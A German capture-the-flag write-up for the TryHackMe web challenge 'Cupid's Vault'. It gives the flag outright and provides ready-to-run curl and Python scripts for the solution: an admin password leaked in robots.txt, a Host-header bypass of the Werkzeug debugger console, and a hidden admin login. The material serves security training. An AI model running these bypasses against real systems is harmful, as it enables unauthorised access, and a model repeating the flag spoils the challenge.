# Cupid's Vault — TryHackMe Challenge (OWASP)

## Übersicht

**Ziel:** http://<TARGET_IP>:5000 — "Love Letters Anonymous" Flask App  
**Stack:** Werkzeug/3.1.5, Python/3.10.12, Flask  
**Flag:** `THM{l0v3_is_in_th3_r0b0ts_txt}`

---

run cupid_vault_exploit.py

## Lösung

### 1. Recon

```
Target: http://<TARGET_IP>:5000
Endpoints gefunden:
  /                         → Homepage "Love Letters Anonymous"
  /cupids_secret_vault/     → "You've found the secret vault, but there's more to discover..."
  /robots.txt               → Disallow: /cupids_secret_vault/*  # cupid_arrow_2026!!!
  /console                  → Werkzeug Debugger (400 wegen Host-Trust-Check)
```

**robots.txt** enthält den Hinweis `cupid_arrow_2026!!!` als Kommentar.

### 2. Werkzeug Debugger — Host-Trust-Bypass

Der Werkzeug Debugger (3.1.5) hat `trusted_hosts = [".localhost", "127.0.0.1"]`.  
Durch Setzen von `Host: localhost` im Request wird der Trust-Check umgangen:

```bash
curl -H "Host: localhost" http://<TARGET>:5000/console
```

→ Console-Seite mit `SECRET = "..."` im HTML.  
→ Debugger ist aktiv, aber PIN-geschützt (9-stelliger numerischer PIN).

### 3. Versteckte Admin-Route

**KRITISCH:** Die Route ist `/cupid_secret_vault/administrator` (OHNE 's'!),  
nicht unter `/cupids_secret_vault/` (mit 's') das in robots.txt steht.

```
GET http://<TARGET>:5000/cupid_secret_vault/administrator
```

→ Login-Seite für Admin-Zugang.

### 4. Admin-Login → Flag

Login mit:
- **Username:** admin  
- **Password:** cupid_arrow_2026!!!  (aus robots.txt Hinweis)

→ **Flag: `THM{l0v3_is_in_th3_r0b0ts_txt}`**

---

## OWASP-Schwachstellen

| OWASP Kategorie | Beschreibung |
|-----------------|-------------|
| **A01 Broken Access Control** | Admin-Panel über versteckte URL erreichbar, kein Rate-Limiting |
| **A05 Security Misconfiguration** | robots.txt leakt den Pfad UND das Passwort als Kommentar |
| **A07 Identification & Authentication Failures** | Schwaches/erratbares Admin-Passwort direkt in robots.txt |
| **Security Misconfiguration** | Werkzeug Debugger in Produktion aktiv (debug=True) |
| **Security Misconfiguration** | Host-Header-Bypass ermöglicht Zugriff auf /console |

## Reproduktion — Skripte

### Schnellster Weg (manuell, 2 Minuten)

```bash
# 1. robots.txt lesen → Hinweis + Passwort
curl http://<TARGET>:5000/robots.txt
# → Disallow: /cupids_secret_vault/*  # cupid_arrow_2026!!!

# 2. Admin-Login aufrufen (OHNE 's' in cupid!)
curl http://<TARGET>:5000/cupid_secret_vault/administrator

# 3. Einloggen
curl -X POST http://<TARGET>:5000/cupid_secret_vault/administrator \
  -d "username=admin&password=cupid_arrow_2026!!!"
# → THM{l0v3_is_in_th3_r0b0ts_txt}
```

### Automatisiert mit Python

```bash
python owasp_hunt/try_owasp_hunt.py
```

Oder als Einzeiler:

```python
import requests
TARGET = "http://<TARGET_IP>:5000"

# Schritt 1: robots.txt → Passwort
r = requests.get(f"{TARGET}/robots.txt")
print(r.text)  # cupid_arrow_2026!!!

# Schritt 2: Admin-Login
r = requests.post(f"{TARGET}/cupid_secret_vault/administrator",
                  data={"username": "admin", "password": "cupid_arrow_2026!!!"})
print(r.text)  # → Flag
```

### Vorhandene Skripte (owasp_hunt/)

| Skript | Zweck | Relevant? |
|--------|-------|-----------|
| `try_owasp_hunt.py` | Haupt-Exploit-Skript | ✅ Ja |
| `_recon_new.py` | Initiale Recon (robots.txt, /console) | ✅ Recon |
| `_exploit_host.py` | Host-Header-Bypass → Debugger SECRET | ⚠️ Bonus (nicht nötig für Flag) |
| `_exploit_focused.py` | Umfassende Route-Enumeration | ❌ Hat /cupid_secret_vault/ verpasst |
| `_exploit_cupid_full.py` | Debugger-PIN-Versuch | ❌ Rabbit Hole |
| `_recon_*.py` | Diverse Recon-Skripte | ❌ Nicht nötig |
| `_exploit_ssh_*.py` | SSH-Versuche | ❌ Nicht nötig |
| `valenfind_readme.md` | Lösung für Challenge 1 (Valenfind) | ✅ Andere Challenge |

### Minimaler Exploit (Copy-Paste-Ready)

Datei: `owasp_hunt/try_owasp_hunt.py`

```python
#!/usr/bin/env python3
"""Cupid's Vault — Minimal Exploit"""
import requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://10.114.142.18:5000"

# 1. Passwort aus robots.txt
robots = requests.get(f"{TARGET}/robots.txt").text
print(f"[*] robots.txt:\n{robots}")
# Hinweis: cupid_arrow_2026!!!

# 2. Admin-Login (Achtung: /cupid_secret_vault/ ohne 's'!)
r = requests.post(f"{TARGET}/cupid_secret_vault/administrator",
                  data={"username": "admin", "password": "cupid_arrow_2026!!!"})
print(f"[*] Status: {r.status_code}")
print(f"[*] Response:\n{r.text}")

import re
flag = re.search(r"THM\{[^}]+\}", r.text)
if flag:
    print(f"\n[!!!] FLAG: {flag.group(0)}")
else:
    print("\n[!] Kein Flag gefunden — Response prüfen")
```

Ausführen:
```bash
python owasp_hunt/try_owasp_hunt.py http://<TARGET_IP>:5000
```

---

## Lessons Learned

1. **robots.txt ist KEIN Sicherheitsmechanismus** — es ist öffentlich und leakt hier sowohl den Pfad als auch das Passwort
2. **Pfad-Variationen prüfen** — `/cupids_secret_vault/` vs `/cupid_secret_vault/` (mit/ohne 's')
3. Der Werkzeug Debugger war ein Rabbit Hole — die eigentliche Schwachstelle war viel simpler
4. Immer zuerst die einfachsten Wege testen (Standard-Admin-Pfade wie `/administrator`, `/admin`, `/login`)
5. **Typo-Fuzzing** machen: Wenn ein Pfad bekannt ist, auch Varianten ohne/mit Plural-s, Tippfehler etc. testen
